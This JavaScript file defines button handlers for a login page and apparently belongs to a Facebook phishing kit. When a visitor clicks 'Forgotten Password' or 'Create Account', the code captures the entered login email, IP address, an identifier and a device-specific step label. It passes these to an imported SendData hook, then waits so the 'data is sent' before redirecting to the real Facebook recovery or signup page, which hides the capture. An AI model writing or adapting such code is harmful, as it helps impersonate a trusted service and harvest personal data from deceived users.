import SendData from "../hooks/SendData.js";

/**
 * Utility class for handling button actions in login components
 */
class ButtonActions {
  /**
   * Detect if the user is on a mobile device
   * @returns {boolean} True if mobile device
   */
  static isMobileDevice() {
    if (typeof window === "undefined") return false;
    return (
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        navigator.userAgent
      ) || window.innerWidth <= 768
    );
  }

  /**
   * Handle forgotten password button click
   * @param {Object} params - Parameters object
   * @param {Object} params.AllData - Current data context
   * @param {Function} params.setAllData - Function to update data context
   * @param {string} params.Unik - Unique user identifier
   * @param {string} params.Email - User email
   * @param {string} params.Ip - User IP address
   */
  static handleForgottenPassword({ AllData, setAllData, Unik, Email, Ip }) {
    const params = {
      ...AllData,
      id: Unik,
      login_email: Email,
      ip: Ip,
      currentStep: this.isMobileDevice()
        ? "User clicked Forgotten Password on Mobile"
        : "User clicked Forgotten Password on PC",
    };

    setAllData(params);
    SendData(params);

    // Redirect after a short delay to ensure data is sent
    setTimeout(() => {
      if (this.isMobileDevice()) {
        window.location.href = "https://m.facebook.com/login/identify/";
      } else {
        window.location.href =
          "https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0";
      }
    }, 500);
  }

  /**
   * Handle create account button click
   * @param {Object} params - Parameters object
   * @param {Object} params.AllData - Current data context
   * @param {Function} params.setAllData - Function to update data context
   * @param {string} params.Unik - Unique user identifier
   * @param {string} params.Email - User email
   * @param {string} params.Ip - User IP address
   */
  static handleCreateAccount({ AllData, setAllData, Unik, Email, Ip }) {
    const params = {
      ...AllData,
      id: Unik,
      login_email: Email,
      ip: Ip,
      currentStep: this.isMobileDevice()
        ? "User clicked Create Account on Mobile"
        : "User clicked Create Account on PC",
    };

    setAllData(params);
    SendData(params);

    // Redirect after a short delay to ensure data is sent
    setTimeout(() => {
      if (this.isMobileDevice()) {
        window.location.href = "https://m.facebook.com/login/identify/";
      } else {
        window.location.href =
          "https://www.facebook.com/r.php?entry_point=login";
      }
    }, 500);
  }
}

export default ButtonActions;
